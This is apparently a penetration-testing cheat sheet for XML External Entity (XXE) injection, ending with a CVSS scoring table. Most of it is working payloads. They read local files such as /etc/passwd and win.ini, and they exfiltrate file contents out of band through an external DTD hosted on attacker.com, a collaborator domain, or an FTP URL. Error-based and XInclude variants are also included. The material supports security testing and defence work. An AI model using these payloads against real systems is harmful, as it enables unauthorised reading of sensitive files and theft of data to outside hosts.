# XML External Entity (XXE): Complete Reference

## Detection Phase

### Classic XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<root>&xxe;</root>
```

### File Read XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR.oastify.com/test">
]>
<root>&xxe;</root>
```

## Blind XXE Exfiltration

### OOB Data Exfiltration
```xml
# Step 1: External DTD on attacker server
# attacker.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.oastify.com/?data=%file;'>">
%eval;
%exfil;

# Step 2: Victim XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start SYSTEM "http://attacker.com/attacker.dtd">
  %start;
]>
<root>&exfil;</root>
```

### Error-Based Blind XXE
```xml
# Force error that includes file content
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## XInclude Attacks
```xml
# When you control XML within an existing document
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## Parameter Entity Chaining
```xml
<!DOCTYPE foo [
  <!ENTITY % p1 SYSTEM "http://attacker.com/evil.dtd">
  %p1;
]>
<root>&exfil;</root>
```

## Binary File Exfiltration
When exfiltrating binary files, encode to base64 first.

### FTP Exfiltration
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| XXE file read | 7.5 | Network, Low, No auth, Confidentiality high |
| XXE -> SSRF -> internal scan | 8.6 | Network, Low, No auth, Changed scope |
| XXE -> DoS (Billion Laughs) | 6.5 | Network, Low, No auth, Availability high |
| Blind XXE OOB data exfil | 7.5 | Network, Low, No auth, Changed scope |
| XXE -> RCE (expect plugin) | 9.8 | Network, Low, No auth, Full impact |